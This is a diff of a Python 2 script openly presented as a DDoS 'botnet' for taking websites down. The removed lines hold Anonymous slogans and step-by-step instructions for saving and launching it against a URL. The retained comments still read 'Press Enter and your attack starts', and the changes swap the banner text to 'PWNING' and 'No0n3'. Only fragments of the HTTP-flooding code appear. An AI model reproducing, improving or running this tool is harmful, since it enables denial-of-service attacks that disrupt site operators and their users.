@@ -1,27 +1,10 @@
-We are Anonymous
-Knowledge is free
-This is a powerful DDOS Botnet
-It can bring internet sites in less than 10 minutes to drop to the tango down
-Everyone should have tools. Everyone can support the collective
-Expect Us
- 
-@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
-Create a text document Copy and paste the script into your document
-Go to Save As
-Show ALL FILES NOT ONLY TXT. files
-Store it under botnet.py on your desktop
-Close the window
-Now open your CMD by pressing Win + R and enter a CMD press ENTER
-The command to use Anonymous CMD is
-@echo off
-Then enter:
-cd desktop
-And now the command to start the script
-botnet.py http: //
-Press Enter and your attack starts
-DO NOT WAIT IMMEDIATELY
- 
-@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
+!#/usr/bin/python
+
+#Written and dummped by Anon
+#command to start the script
+#botnet.py http: //
+#Press Enter and your attack starts
+
 
 import urllib2
 import sys
@@ -858,9 +841,9 @@ print \
      +-----------------------+  |      ,"        ,"    |
      |  .-----------------.  |  |     +---------+      |
      |  |                 |  |  |     | -==----'|      |
-     |  |  I LOVE DDOS!   |  |  |     |         |      |
+     |  |                 |  |  |     |         |      |
      |  |  Bad command or |  |  |/----|`---=    |      |
-     |  |  C:\>_Anonymous |  |  |   ,/|==== ooo |      ;
+     |  |  C:\>_          |  |  |   ,/|==== ooo |      ;
      |  |                 |  |  |  // |(((( [33]|    ,"
      |  `-----------------'  |," .;'| |((((     |  ,"
      +-----------------------+  ;;  | |         |,"
@@ -869,7 +852,7 @@ print \
   /  oooooooooooooooo  .o.  oooo /,   \,"-----------
  / ==ooooooooooooooo==.o.  ooo= //   ,`\--{)B     ,"
 /_==__==========__==_ooo__ooo=_/'   /___________,"
-This is Anonymous: OpNestle has started!
+
 """
 print '---------------------------------------------------'
 
@@ -896,7 +879,7 @@ def httpcall(url):
 	except urllib2.HTTPError, e:
 			#print e.code
 			set_flag(1)
- 			print '[+] ~> We are Anonymous - ExpectUS  <~ [+]'
+ 			print '[+] ~> PWNING  <~ [+]'
 			code=500
 	except urllib2.URLError, e:
 			#print e.reason
@@ -938,7 +921,7 @@ else:
 		usage()
 		sys.exit()
 	else:
-		print "Copyright: Anonymous"
+		print " No0n3"
 		if len(sys.argv)== 3:
 			if sys.argv[2]=="safe":
 				set_safe()
